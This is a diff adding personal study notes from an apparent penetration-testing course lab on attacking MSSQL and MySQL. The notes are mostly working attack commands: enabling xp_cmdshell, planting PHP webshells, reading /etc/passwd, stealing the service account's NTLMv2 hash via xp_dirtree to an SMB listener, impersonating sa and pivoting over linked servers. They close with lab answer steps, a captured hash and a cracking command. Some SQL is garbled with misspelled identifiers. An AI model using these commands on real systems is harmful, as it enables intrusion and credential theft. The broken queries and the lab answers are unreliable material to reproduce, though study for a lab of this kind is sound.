@@ -485,3 +485,151 @@ Note: When we authenticate to MSSQL using sqlcmd we can use the parameters -y (S
 $sqsh -S 10.129.203.7 -U julio -P 'Passwordp' -H
 <alter>
 $mssqlclient.py -p 1433 julio@10.129.203.7
+-Note: When we authenticate to MSSQL using sqsh we can use the parameters -h to disable headers and footers for a cleaner look.
+-we can use SERVERNAME\\accountname or .\\accountname. The full command would look like:
+$sqsh -S 10.129.203.7 -U .\\julio -P 'Mypassword!' -H
+
+\\SQL Default Databases
+Before using SQL, know the default MySQL and MSSQL databases — they store system info (names, tables, columns) and support enumeration, but rarely contain company data.
+Note: We will get an error if we try to list or connect to a database we don't have permissions to.
+-MySQL default system schemas/databases:
+    mysql - is the system database that contains tables that store information required by the MySQL server
+information_schema - provides access to database metadata
+performance_schema - is a feature for monitoring MySQL Server execution at a low level
+sys - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema
+
+-MSSQL default system schemas/databases:
+
+    master - keeps the information for an instance of SQL Server.
+msdb - used by SQL Server Agent.
+model - a template database copied for each new database.
+resource - a read-only database that keeps system objects visible in every database on the server in sys schema.
+tempdb - keeps temporary objects for SQL queries.
+
+\\SQL Syntax
+Show Databases
+mysql>SHOW DATABASES;
+If we use sqlcmd, we will need to use GO after our query to execute the SQL syntax.
+$SELECT name FROM master.dbo.sysdatabases
+$GO
+\\Select a database
+mysql>USE htbusers;  >GO
+\\Show tables
+mysql>SHOW TABLES;
+$SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES  > GO
+\\Select all Data from Table "users"
+mysql>SELECT * FROM users; > GO
+\\Execute commands
+-Command execution lets attackers control the OS. With sufficient privileges SQL can run system commands. MSSQL’s xp_cmdshell does this — powerful and disabled by default (enable via Policy-Based Management or sp_configure), runs as the SQL Server service account, and is synchronous.
+Example: EXEC xp_cmdshell 'whoami';
+\\xp_cmdshell
+1>xp_cmdshell 'whoami'  2>GO
+-If xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
+$mssql>EXECUTE sp_configure 'show advanced options', 1 >GO
+$RECONFIGURE >GO 
+$EXECUTE sp_configure 'xp_cmdshell', 1 >GO
+$RECONFIGURE  >GO
+
+-Other ways to get command execution include extended stored procedures, CLR assemblies, SQL Server Agent jobs, external scripts, and registry tweaks like xp_regwrite (privilege escalation) — out of scope here.
+MySQL UDFs can run C/C++ (a command-exec UDF exists on GitHub); rare in production but possible.
+
+\\Write Local files
+MySQL has no xp_cmdshell, but with sufficient privileges you can write an executable file (e.g. via SELECT ... INTO OUTFILE) into a webserver directory (PHP/ASP.NET) and then trigger it to run.
+https://mariadb.com/docs/server/reference/sql-statements/data-manipulation/selecting-data/select-into-outfile
+$mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+-In MySQL, a global system variable secure_file_priv limits the effect of data import and export operations, such as those performed by the LOAD DATA and SELECT … INTO OUTFILE statements and the LOAD_FILE() function. These operations are permitted only to users who have the FILE privilege.
+
+secure_file_priv may be set as follows:
+
+If empty, the variable has no effect, which is not a secure setting.
+If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
+If set to NULL, the server disables import and export operations.
+\\MySQL- Secure File Privileges
+mysql>show variables like "secure_file_priv";
+-To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:
+\\MSSQL - Enable Ole Automation Procedures
+1>sp_configure 'show advanced options', 1 >GO
+3>RECONFIGURE >GO
+5>sp_configure 'Ole Automation Procedures', 1 >GO
+7>RECONFIGURE >GO
+\\MSSQL - Create a File
+1> DECLARE @OLE INT
+2> DECLARE @FileID INT
+3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+6> EXECUTE sp_OADestroy @FileID
+7> EXECUTE sp_OADestroy @OLE
+8> GO
+\\Read Local files
+-By default, MSSQL allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:
+Read Local Files in MSSQL
+1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents  > GO
+-As we previously mentioned, by default a MySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:
+\\MySQL - Read Local Files in MySQL
+mysql> select LOAD_FILE("/etc/passwd");
+\\Capture MSSQL Service Hash
+-ChatGPT said:
+
+Point xp_subdirs/xp_dirtree at your SMB listener and MSSQL will authenticate to it, leaking the SQL Server service account’s NTLMv2 hash. Start an SMB responder (e.g., Responder or impacket-smbserver) and run the SQL query to trigger the authentication.
+-To make this work, we need first to start Responder or impacket-smbserver and execute one of the following SQL queries:
+\\XP_DIRTREE Hash Stealing
+1>EXEC master..xp_dirtree '\\10.10.110.17\share\' 2>GO
+\\XP_SUBDIRS Hash Stealing
+1>EXEC master..xp_subdirs '\\10.10.110.17\share\' 2>GO
+-If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.
+\\XP_SUBDIRS Hash Stealing with Responder
+$sudo responder -I tun0
+\\XP_SUBDIRS Hash Stealing with impacket
+$sudo impacket-smbserver share ./ -smb2support
+\\Impersonate Existing Users with MSSQL
+-SQL svr has a special perm name IMPERSONATE, that allow the exec user to take on the perm of another user or login until the context is reset or the session enumdomousers
+-First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:
+\\identify Users that we can impersonate
+1>SELECT distinct b.name
+2>FROM sys.server_permissions 0
+3>INNER JOIN sys.server_pricipals b 
+4>ON a.grator_pricipal_id = b.grator_pricipal_id
+5>WHERE a.permission_name = 'IMPERSONATE'
+6>GO
+-To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:
+\\Verify our Current User and Role
+1>SELECT SYSTEM_USER
+2>SELECT IS_SRVROLEMEMBER('sysadmin') 3>GO
+-Return code 0 = not sysadmin. Impersonate sa with:
+EXECUTE AS LOGIN = 'sa';
+then run the commands.
+\\Impersonating the SA User
+1>EXECUTE AS LOGIN = 'sa'
+2>SELECT SYSTEM_USER
+3>SELECT IS_SRVROLEMEMBER('sysadmin') >GO
+-Note: It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using USE master.
+-We can now execute any command as a sysadmin as the returned value 1 indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement REVERT.
+-Note: If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.
+\\Communicate with Other Databases with MSSQL
+-MSSQL linked servers let one DB query another (SQL Server or other DB). If a linked server uses remote credentials with sysadmin rights, you can pivot and run queries/commands on the remote instance — find and test linked servers.
+-MSSQL has a configuration option called linked servers. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.
+\\identify linked Servers in MSSQL
+1>SELECT srvname, isremote FROM sysservers >GO
+-https://learn.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql?view=sql-server-ver17
+-Next, we can attempt to identify the user used for the connection and its privileges. The EXECUTE statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets ([ ]).
+1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+2> GO
+-Note: If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).
+
+<test>What is the password for the "mssqlsvc" user?
+$sudo apt install sqlcmd
+htbduser:MSSQLAccess01!:
+$sql -S <ip> -U htbdbuser
+-In another terminal tab on Pwnbox/PMVPN, students need to start an SMB share with impacket-smbserver and utilize the flag -smb2support:
+$sudo impacket-smbserver share ./ -smb2support
+Afterward, using the terminal tab with the sqlcmd connection, students need to steal the MSSQL service account hash using either xp_subdirs or xp_dirtree, the latter will be used:
+EXEC master..xp_dirtree '\\pwnIp\share' >GO
+Students will receive the NetNTLMv2 hash of mssqlsvc on the terminal tab with impacket-smbserver running:
+$echo "mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:da87f7aa577b48e8361cf1b021e6bfca:010100000000000000555ef6718cd801e1b423320a45d0570000000001001000760055004a005100610058005200550003001000760055004a00510061005800520055000200100069004700430077004f0055006b0077000400100069004700430077004f0055006b0077000700080000555ef6718cd80106000400020000000800300030000000000000000000000000300000f4316f662256a822989f5d2574efb5b4cbf92c2ce43cb82538c6b2b358a130650a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0034000000000000000000" > hash.txt
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+
+<test>Enumerate the "flagDB" database and submit a flag as your answer.
+$sqlcmd -S <ip> -U .\\mssqlsvc
+sql>use flagDB >GO > SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES >GO
+$SELECT * FROM tb_flag > GO
